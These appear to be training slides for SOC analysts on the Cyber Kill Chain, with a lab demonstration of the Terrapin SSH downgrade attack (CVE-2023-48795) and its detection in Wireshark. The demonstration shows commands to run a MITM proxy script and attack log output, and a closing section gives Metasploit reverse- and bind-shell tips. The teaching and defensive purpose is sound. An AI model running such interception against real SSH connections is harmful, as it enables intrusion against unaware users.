The Cyber Kill Chain — Origin

WHAT IS IT?
  • Developed by Lockheed Martin in 2011
  • Adapted from the military "kill chain" concept
  • Describes structured stages of a cyber attack
  • Used by SOC analysts and threat hunters globally
PURPOSE
  • Model how attackers plan and execute attacks
  • Identify detection/prevention opportunities
  • Break the attack before data loss occurs
  • Structure incident response analysis

PENDING TASK — CVE-2023-48795

Terrapin Attack — SSH Protocol Downgrade

WHAT IS TERRAPIN?
  • Vulnerability in SSH protocol handshake (CVE-2023-48795)
  • Attacker acts as MITM between SSH client and server
  • Drops SSH_MSG_EXT_INFO packet silently during handshake
  • Security extensions removed without any visible error
  • SSH login succeeds — neither user nor server is aware
ATTACK FLOW
1
Client initiates SSH connection
SSH client connects to port 2222 (MITM proxy)
2
MITM proxy relays to real server
Attacker forwards traffic, monitors the handshake
3
SSH_MSG_NEWKEYS intercepted
Both sides exchange new keys — proxy captures this moment
4
EXT_INFO packet DROPPED ✗
Security extensions silently removed, connection continues
# Terminal 1: Start MITM proxy on attacker container
$ docker exec -it terrapin-attacker python3 /attack/manual_attack_demo.py
[*] Starting proxy on port 2222 → target: vulnerable-server:22
[*] Waiting for SSH client to connect...

# Terminal 2: SSH client connects THROUGH the proxy
$ docker exec -it terrapin-client ssh -o StrictHostKeyChecking=no -p 2222 testuser@attacker
# Password: password123

[INFO] SSH_MSG_NEWKEYS detected (client→server)
[INFO] SSH_MSG_NEWKEYS detected (server→client)
[ATTACK] Dropping SSH_MSG_EXT_INFO packet from server!
[ATTACK] Packet size: 156 bytes — security extensions removed
[+] Attack SUCCESS! Dropped 1 EXT_INFO packet(s)

# Wireshark: filter `ssh` → find NEWKEYS without EXT_INFO after it
⚠
Wireshark Proof: Apply filter ssh → Locate SSH_MSG_NEWKEYS (type 21) → Confirm that SSH_MSG_EXT_INFO (type 7) is missing immediately after. This proves the attack successfully dropped the security extension packet.

SOC ANALYST USES KILL CHAIN TO:
  • Identify the current stage of an ongoing attack
  • Recognize attacker objectives and predict next move
  • Detect intrusions before data exfiltration occurs
  • Prioritize incident response actions effectively
LIMITATIONS OF TRADITIONAL MODEL
  • Doesn't address insider threat scenarios
  • Focuses on perimeter — ignores east-west movement
  • Not significantly updated since 2011
  • Modern attackers blend or skip multiple phases
COMPLEMENTARY FRAMEWORKS
  • MITRE ATT&CK — Detailed TTPs with real-world adversary techniques
  • Unified Kill Chain — 18 phases, covers insider threats & APTs
  • Diamond Model — Adversary-capability-infrastructure-victim analysis
BEST DETECTION TOOLS
  • SIEM (Splunk / ELK Stack) — correlation rules across phases
  • EDR (CrowdStrike / SentinelOne) — endpoint telemetry & response
  • Wireshark / Zeek — deep network packet analysis
  • Sysmon — Windows process, network & registry logging
CONCLUSION

Key Takeaways

"Breaking the kill chain at any stage prevents the attacker from reaching their objective. The earlier the break, the lower the cost of defense — and the higher the defender's advantage."
KILL CHAIN SUMMARY
  • 7 structured phases from recon to objective completion
  • Nmap scanning = Phase 1 (Active Reconnaissance)
  • Each open port creates a vector into later attack phases
  • SOC analysts can detect and break the chain at every stage
✓
Mastering this framework is essential for SOC Analysts, Threat Hunters, and Incident Responders to build effective cyber defense strategies.
TERRAPIN (CVE-2023-48795)
  • SSH protocol-level downgrade via silent MITM attack
  • No visible error displayed to the SSH user at any point
  • Detected via Wireshark — NEWKEYS without following EXT_INFO
  • Mitigate: update OpenSSH, disable vulnerable KEX algorithms
METASPLOIT INSIGHTS
  • Auto payload = best architecture compatibility for the target
  • Reverse shell preferred when the firewall blocks inbound
  • Bind shell when attacker has direct network access to target
